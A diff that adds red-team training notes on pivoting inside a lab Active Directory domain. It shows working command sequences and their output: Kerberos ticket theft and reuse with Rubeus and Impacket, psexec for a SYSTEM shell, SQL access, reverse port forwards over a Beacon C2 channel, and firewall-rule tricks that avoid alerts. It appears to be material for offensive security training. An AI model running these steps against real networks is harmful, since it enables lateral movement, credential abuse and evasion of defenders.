@@ -219,3 +219,270 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Saving ticket in jking.ccache
 ```
 
+{% hint style="info" %}
+Be sure to use the fully qualified domain name, `dev.cyberbotic.io`, rather than the `NetBIOS` name, `DEV`.
+{% endhint %}
+
+This will automatically output the ticket in `ccache` format which can be used with other Impacket scripts. &#x20;
+
+However, we must first create an environment variable called <mark style="color:green;">`KRB5CCNAME`</mark> that will point to the `ccache` file.
+
+```
+ubuntu@DESKTOP-3BSK7NO ~> export KRB5CCNAME=jking.ccache
+```
+
+**Now we can use&#x20;**<mark style="color:yellow;">**`psexec.py`**</mark>**&#x20;to get a SYSTEM shell on `WEB`:**
+
+```
+ubuntu@DESKTOP-3BSK7NO ~> proxychains psexec.py -dc-ip 10.10.122.10 -target-ip 10.10.122.30 -no-pass -k dev.cyberbotic.io/jking@web.dev.cyberbotic.io
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:445-<><>-OK
+|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
+[*] Requesting shares on 10.10.122.30.....
+[*] Found writable share ADMIN$
+[*] Uploading file rzBHyscR.exe
+[*] Opening SVCManager on 10.10.122.30.....
+[*] Creating service msin on 10.10.122.30.....
+[*] Starting service msin.....
+|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:445-<><>-OK
+|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
+|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:445-<><>-OK
+|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
+[!] Press help for extra shell commands
+|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:445-<><>-OK
+|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
+Microsoft Windows [Version 10.0.20348.887]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> hostname && whoami
+web
+nt authority\system
+
+C:\Windows\system32> exit
+[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
+[*] Opening SVCManager on 10.10.122.30.....
+[*] Stopping service msin.....
+[*] Removing service msin.....
+[*] Removing file rzBHyscR.exe.....
+```
+
+### Dealing with Tickets in Kirbi Format
+
+If you have a ticket in `kirbi` format obtained with another tool, it can be converted to `ccache` format for use with `Impacket`. &#x20;
+
+**For example, here I'm using the TGT delegation trick to get a usable TGT for `bfarmer` from a non-elevated session:**
+
+```
+beacon> getuid
+[*] You are DEV\bfarmer
+
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
+
+[*] Action: Request Fake Delegation TGT (current user)
+[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
+[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dc-2.dev.cyberbotic.io'
+[+] Kerberos GSS-API initialization success!
+[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+[*] Found the AP-REQ delegation ticket in the GSS-API output.
+[*] Authenticator etype: aes256_cts_hmac_sha1
+[*] Extracted the service ticket session key from the ticket cache: QPQjXYnE0c8tkwjNuTFxaNArevF+TosSgYJ/kQcrShw=
+[+] Successfully decrypted the authenticator
+[*] base64(ticket.kirbi):
+
+doIFzj[...snip...]MuSU8=
+```
+
+**Base64 decode the ticket and write it to&#x20;**<mark style="color:yellow;">**`bfarmer.kirbi`**</mark>**:**
+
+```
+ubuntu@DESKTOP-3BSK7NO ~> echo -en 'doIFzj[...snip...]MuSU8=' | base64 -d > bfarmer.kirbi
+```
+
+**Then convert it using&#x20;**<mark style="color:yellow;">**`ticketConverter.py`**</mark>**:**
+
+```
+ubuntu@DESKTOP-3BSK7NO ~> ticketConverter.py bfarmer.kirbi bfarmer.ccache
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] converting kirbi to ccache...
+[+] done
+```
+
+{% hint style="info" %}
+You can also use `ticketConverter.py` to convert from `ccache` to `kirbi`.
+{% endhint %}
+
+### Using a TGT to Interact w/ a SQL-2 Service
+
+**Now let's use this TGT to interact with the `SQL-2` service:**
+
+```
+ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -dc-ip 10.10.122.10 -no-pass -k dev.cyberbotic.io/bfarmer@sql-2.dev.cyberbotic.io
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.25:1433-<><>-OK
+[*] Encryption required, switching to TLS
+|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL-2): Line 1: Changed database context to 'master'.
+[*] INFO(SQL-2): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
+[!] Press help for extra shell commands
+
+SQL> select @@servername;
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+SQL-2
+```
+
+**This may require adding a static host entry to&#x20;**<mark style="color:yellow;">**`/etc/hosts`**</mark>**&#x20;and changing the&#x20;**<mark style="color:yellow;">**`proxy_dns`**</mark>**&#x20;setting in&#x20;**<mark style="color:yellow;">**`/etc/proxychains.conf`**</mark>**&#x20;to&#x20;**<mark style="color:yellow;">**`remote_dns`**</mark>**:**
+
+Kerberos tickets can also be leveraged from the Windows attacker machine.  The first step is to add `*.cyberbotic.io` your `Proxifier` proxification rule(s). &#x20;
+
+This is because Kerberos uses hostnames rather than IP addresses and `Proxifier` won't proxy Kerberos traffic unless the domains are explicitly set in the rules.
+
+<figure><img src="../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>
+
+**Next, launch an instance of `cmd.exe` or `powershell.exe` using `runas /netonly` with a valid domain username, but a fake password:**
+
+```
+PS C:\Users\Attacker> runas /netonly /user:dev.cyberbotic.io\bfarmer powershell.exe
+Enter the password for dev.cyberbotic.io\bfarmer: FakePass
+Attempting to start powershell.exe as user "dev.cyberbotic.io\bfarmer" ...
+```
+
+**The spawned process will have no Kerberos tickets in its cache:**
+
+```
+PS C:\Windows\system32> klist
+
+Current LogonId is 0:0x260072
+
+Cached Tickets: (0)
+```
+
+This method of pivoting prefers the presence of the correct service ticket(s) up front, rather than relying on a single TGT in the cache. &#x20;
+
+**If we want to access the&#x20;**<mark style="color:yellow;">**`SQL-2`**</mark>**&#x20;service through&#x20;**<mark style="color:yellow;">**`HeidiSQL`**</mark>**&#x20;then we need a service ticket for the `MSSQLSvc` service:**
+
+```
+PS C:\Windows\system32> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:doIFzj[...snip...]MuSU8= /service:MSSQLSvc/sql-2.dev.cyberbotic.io:1433 /dc:dc-2.dev.cyberbotic.io /ptt
+
+[*] Action: Ask TGS
+[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+[*] Building TGS-REQ request for: 'MSSQLSvc/sql-2.dev.cyberbotic.io:1433'
+[*] Using domain controller: dc-2.dev.cyberbotic.io (127.95.0.2)
+[+] TGS request successful!
+[+] Ticket successfully imported!
+
+PS C:\Windows\system32> klist
+
+Current LogonId is 0:0x260072
+
+Cached Tickets: (1)
+
+#0>     Client: bfarmer @ DEV.CYBERBOTIC.IO
+        Server: MSSQLSvc/sql-2.dev.cyberbotic.io:1433 @ DEV.CYBERBOTIC.IO
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
+        Start Time: 10/11/2023 14:23:52 (local)
+        End Time:   10/11/2023 19:22:58 (local)
+        Renew Time: 10/18/2023 9:22:58 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called:
+```
+
+**Launch `HeidiSQL` from the same powershell window:**
+
+```
+PS C:\Windows\system32> C:\Tools\HeidiSQL\heidisql.exe
+```
+
+**Set the target hostname to&#x20;**<mark style="color:yellow;">**`sql-2.dev.cyberbotic.io`**</mark>**&#x20;and connect:**
+
+![](https://files.cdn.thinkific.com/file_uploads/584845/images/607/fd7/b78/heidi.png)
+
+## Browsers
+
+Firefox plus the _**FoxyProxy**_ extension is ideal for pivoting a browser into the network, to view internal web applications.  Simply add a new entry in _**FoxyProxy**_ that points to the Beacon **SOCKS** proxy.
+
+![](https://files.cdn.thinkific.com/file_uploads/584845/images/3e5/73f/7fd/foxy-proxy.png)
+
+**Then navigate to the internal web server, `10.10.122.30`:**
+
+![](https://files.cdn.thinkific.com/file_uploads/584845/images/797/345/0f5/iis.png)
+
+You can also perform NTLM authentication following the steps outlined in [this post](https://offensivedefence.co.uk/posts/ntlm-auth-firefox/).
+
+## Reverse Port Forwards
+
+Reverse Port Forwarding allows a machine to redirect inbound traffic on a specific port to another IP and port.
+
+### Use Cases
+
+A useful implementation of this allows machines to bypass firewall and other network segmentation restrictions, to talk to nodes they wouldn't normally be able to.&#x20;
+
+**For example, we can use the console of&#x20;**_**Domain Controller 2**_**&#x20;to demonstrate that it&#x20;**_**does not**_**&#x20;have outbound access to our team server:**
+
+```
+PS C:\Users\Administrator> hostname
+dc-2
+
+PS C:\Users\Administrator> iwr -Uri http://nickelviper.com/a
+iwr : Unable to connect to the remote server
+```
+
+**We know of course that Workstation 2 does - so we can create a reverse port forward to relay traffic between Domain Controller 2 and our team server**:
+
+```
+beacon> rportfwd 8080 127.0.0.1 80
+[+] started reverse port forward on 8080 to 127.0.0.1:80
+```
+
+This will bind port `8080` on Workstation 2.
+
+```
+beacon> run netstat -anp tcp
+TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
+```
+
+Any traffic hitting this port will be tunnelled back to the team server over the C2 channel. &#x20;
+
+**The team server will then relay the traffic to the forward host/port, then send the response back over Beacon.  Now, we can download the file via this port forward:**
+
+```
+PS C:\Users\Administrator> iwr -Uri http://wkstn-2:8080/a
+
+StatusCode        : 200
+```
+
+{% hint style="danger" %}
+**OPSEC**\
+\
+When the Windows firewall is enabled, it will prompt the user with an alert when an application attempts to listen on a port that is not explicitly allowed. &#x20;
+
+Allowing access requires local admin privileges and clicking cancel will create an explicit block rule.\
+\
+![](https://files.cdn.thinkific.com/file_uploads/584845/images/9f7/2d7/24e/alert.png)
+{% endhint %}
+
+**You must therefore create an allow rule before running a reverse port forward using either&#x20;**<mark style="color:yellow;">**`netsh`**</mark>**&#x20;or&#x20;**<mark style="color:yellow;">**`New-NetFirewallRule`**</mark>**, as adding and removing rules does not create a visible alert:**
+
+```
+beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
+```
+
+Don't be lazy by disabling the firewall entirely.
+
+**You can delete a firewall rule later by its&#x20;**<mark style="color:yellow;">**`DisplayName`**</mark>**:**
+
+```
+beacon> powershell Remove-NetFirewallRule -DisplayName "8080-In"
+```
